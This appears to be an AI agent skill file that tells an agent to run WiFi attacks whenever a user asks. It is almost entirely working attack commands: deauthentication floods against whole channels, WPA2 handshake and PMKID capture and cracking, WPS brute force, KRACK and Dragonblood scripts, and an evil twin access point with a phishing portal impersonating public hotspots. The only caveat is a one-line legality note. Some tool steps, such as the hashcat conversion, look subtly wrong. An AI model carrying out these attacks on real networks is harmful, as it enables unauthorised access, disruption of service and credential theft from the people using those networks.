---
name: wireless-hacking
description: WiFi cracking, evil twin, deauth attacks, WPA2/WPA3.
tags: [wifi, wireless, wpa2, wpa3, aircrack, evil-twin, deauth]
---

# Wireless Hacking

Use when user requests WiFi hacking, wireless network attacks, WPA/WPA2/WPA3 cracking, evil twin, or deauthentication attacks.

## Trigger Conditions
- WiFi password cracking
- WPA2/WPA3 attacks
- Evil twin access point
- Deauthentication attacks
- Handshake capture
- Rogue AP setup

## Requirements

### Hardware
- WiFi adapter with monitor mode support
  - Alfa AWUS036ACH (recommended)
  - TP-Link TL-WN722N v1
  - Panda PAU09
- External antenna (optional, for better range)

### Software
```bash
# Kali Linux / Ubuntu
apt update
apt install aircrack-ng hostapd dnsmasq wifite bettercap

# Arch Linux
pacman -S aircrack-ng hostapd dnsmasq wifite

# Check WiFi adapter
iwconfig
# Should show wlan0 or similar
```

## WPA2 Cracking Workflow

### 1. Enable Monitor Mode
```bash
# Kill interfering processes
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan0
# Creates wlan0mon interface

# Verify
iwconfig wlan0mon
```

### 2. Scan Networks
```bash
# Scan all networks
airodump-ng wlan0mon

# Output shows:
# BSSID (MAC address)
# PWR (signal strength)
# CH (channel)
# ESSID (network name)
```

### 3. Capture Handshake
```bash
# Target specific network
airodump-ng -c [CHANNEL] --bssid [TARGET_BSSID] -w capture wlan0mon

# Example:
airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Wait for client to connect OR force deauth (next step)
```

### 4. Deauth Attack (Force Handshake)
```bash
# Open new terminal
# Deauth all clients on target AP
aireplay-ng --deauth 10 -a [TARGET_BSSID] wlan0mon

# Deauth specific client
aireplay-ng --deauth 10 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0mon

# Example:
aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon

# Watch first terminal for "WPA handshake" message
```

### 5. Crack Handshake
```bash
# Using wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [TARGET_BSSID] capture-01.cap

# Using custom wordlist
aircrack-ng -w custom_passwords.txt -b 00:11:22:33:44:55 capture-01.cap

# GPU acceleration with hashcat
# Convert to hashcat format
hccap2john capture-01.cap > capture.hccap

# Crack with hashcat
hashcat -m 22000 capture.hccap rockyou.txt
```

## WPA3 Attacks

### Dragonblood Attack
```bash
# Install dependencies
git clone https://github.com/vanhoefm/dragonslayer
cd dragonslayer
./build.sh

# Downgrade attack (force WPA3 to WPA2)
./dragonslayer.py --interface wlan0mon --downgrade [TARGET_BSSID]

# Then use standard WPA2 cracking
```

### Dictionary Attack on WPA3
```bash
# WPA3 still vulnerable to offline dictionary attacks
# Use wpa_supplicant to attempt connections

# Create config
cat > wpa3_test.conf <<EOF
network={
    ssid="TargetNetwork"
    key_mgmt=SAE
    psk="password123"
}
EOF

# Test passwords from wordlist
while read password; do
    sed -i "s/psk=.*/psk=\"$password\"/" wpa3_test.conf
    timeout 10 wpa_supplicant -i wlan0 -c wpa3_test.conf
    if [ $? -eq 0 ]; then
        echo "Password found: $password"
        break
    fi
done < passwords.txt
```

## Evil Twin Attack

### Manual Setup
```bash
# 1. Create fake AP with hostapd
cat > hostapd.conf <<EOF
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
EOF

# 2. Configure DHCP server
cat > dnsmasq.conf <<EOF
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,8h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# 3. Setup IP forwarding
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
echo 1 > /proc/sys/net/ipv4/ip_forward

# 4. Setup NAT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# 5. Start services
hostapd hostapd.conf &
dnsmasq -C dnsmasq.conf &

# 6. Capture traffic
tcpdump -i wlan0 -w evil_twin_capture.pcap
```

### Automated with Wifiphisher
```bash
# Install
git clone https://github.com/wifiphisher/wifiphisher
cd wifiphisher
python3 setup.py install

# Run evil twin with phishing portal
wifiphisher -aI wlan0 -e "FreeWiFi" -p firmware-upgrade

# Custom phishing page
wifiphisher -aI wlan0 -e "Starbucks WiFi" -p custom_page.html
```

## Deauthentication Attacks

### Mass Deauth
```bash
# Deauth everyone on all APs (channel 6)
mdk3 wlan0mon d -c 6

# Deauth specific network
mdk3 wlan0mon d -b [TARGET_BSSID]

# Intelligent deauth (targets strongest APs)
mdk3 wlan0mon d -c 6 -s 100
```

### Persistent Deauth
```bash
# Keep deauthing every 5 seconds
while true; do
    aireplay-ng --deauth 5 -a [TARGET_BSSID] wlan0mon
    sleep 5
done
```

## PMKID Attack (Clientless)

### Capture PMKID
```bash
# No client needed!
# Capture PMKID directly from AP

# Using hcxdumptool
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcaptool -z pmkid.16800 pmkid.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid.16800 rockyou.txt
```

## WPS Attacks

### Pixie Dust Attack
```bash
# Scan for WPS-enabled APs
wash -i wlan0mon

# Pixie Dust attack (works on vulnerable routers)
reaver -i wlan0mon -b [TARGET_BSSID] -K -vv

# If successful, gives WPS PIN and WPA password
```

### WPS PIN Brute Force
```bash
# Online brute force (very slow, ~8-10 hours)
reaver -i wlan0mon -b [TARGET_BSSID] -vv

# With delay to avoid rate limiting
reaver -i wlan0mon -b [TARGET_BSSID] -vv -d 5 -T 0.5
```

## Advanced Techniques

### Karma Attack
```bash
# Respond to all probe requests
# Clients looking for "HomeWiFi" will connect to you

mdk3 wlan0mon p -t [CLIENT_MAC]
```

### KRACK Attack (WPA2)
```bash
# Key Reinstallation Attack
git clone https://github.com/vanhoefm/krackattacks-scripts
cd krackattacks-scripts

# Run attack
./krack-all-zero-tk.py wlan0mon [TARGET_BSSID]
```

## Automated Tools

### Wifite (All-in-one)
```bash
# Install
apt install wifite

# Auto-crack all networks in range
wifite

# Target WPA2 only
wifite --wpa

# Custom wordlist
wifite --dict /path/to/wordlist.txt

# Kill after finding password
wifite --kill
```

### Bettercap
```bash
# Interactive mode
bettercap -iface wlan0mon

# Inside bettercap:
> wifi.recon on
> wifi.show
> set wifi.ap.bssid [TARGET_BSSID]
> wifi.deauth [CLIENT_MAC]
```

## Wordlist Generation

### Crunch (Generate passwords)
```bash
# Generate 8-12 char passwords with lowercase+digits
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# Phone number patterns (Indonesia)
crunch 10 13 0123456789 -t 08%%%%%%%%% -o phone_wordlist.txt

# Common patterns
crunch 8 8 -t password@@@@ -o password_patterns.txt
```

### Cewl (Generate from website)
```bash
# Scrape company website for password candidates
cewl https://target-company.com -d 3 -m 6 -w company_wordlist.txt
```

## Mobile (Termux)

### Setup on Android
```bash
# Requires root + external WiFi adapter

# Install packages
pkg install root-repo
pkg install aircrack-ng

# Enable monitor mode (requires compatible adapter)
ip link set wlan1 down
iw wlan1 set monitor control
ip link set wlan1 up

# Run attacks (same as Linux)
```

## Defense Detection

### Check if under attack
```bash
# Monitor deauth packets
airodump-ng wlan0mon --write detect

# Look for excessive deauth in capture:
wireshark detect-01.cap
# Filter: wlan.fc.type_subtype == 0x0c
```

## Pitfalls
- **Legal**: Illegal to attack networks you don't own
- **Detection**: IDS can detect deauth floods
- **WPA3**: Stronger against offline attacks
- **802.11w**: Protected Management Frames prevent deauth
- **MAC filtering**: Can be bypassed with MAC spoofing

## Related Skills
- `advanced-hacking`: Network attacks, MITM
- `social-engineering`: Evil twin phishing pages
- `network-scanning-recon`: Discover targets
